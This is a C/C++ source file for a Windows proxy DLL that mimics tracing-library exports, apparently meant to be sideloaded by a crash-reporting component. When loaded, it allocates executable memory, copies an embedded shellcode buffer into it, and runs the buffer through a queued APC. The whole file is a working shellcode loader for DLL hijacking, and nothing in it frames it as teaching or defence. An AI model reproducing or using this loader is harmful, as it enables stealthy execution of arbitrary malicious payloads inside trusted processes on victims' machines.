#include "ntapi.hpp"
#include "otherapi.hpp"
#include "shellcode.hpp"

PVOID lpBaseAddress = 0;
SIZE_T Size = sizeof(buf);

// Faultrep.dll!WerpInitiateCrashReporting
// TraceDeregisterW, TraceRegisterExW, TracePrintfW, RouterLogEventStringW, TraceDeregisterA, TraceRegisterExA, TracePrintfA
// TracePrintW, TraceDeregisterA, TraceRegisterExA, TracePrintfA

EXTERN_C __declspec(dllexport) ULONG_PTR WINAPI TraceDeregisterA()
{
    return 0;
}
EXTERN_C __declspec(dllexport) ULONG_PTR WINAPI TraceRegisterExA()
{
    return (ULONG_PTR)lpBaseAddress;
}
EXTERN_C __declspec(dllexport) ULONG_PTR WINAPI TracePrintfA()
{
    return (ULONG_PTR)Size;
}

EXTERN_C __declspec(dllexport) ULONG_PTR WINAPI TracePrintfW()
{
    if (!lpBaseAddress || Size == sizeof(buf))
    {
        NtAllocateVirtualMemory(NtCurrentProcess(), &lpBaseAddress, 0, &Size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        Fastmemcpy(lpBaseAddress, buf, sizeof(buf));

        NtQueueApcThread(NtCurrentThread(), (PKNORMAL_ROUTINE)lpBaseAddress, 0, 0, 0);
    }

    return Size * (ULONG_PTR)lpBaseAddress;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls((HMODULE)hinstDLL);
        TracePrintfW();
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }

    return TRUE;
}
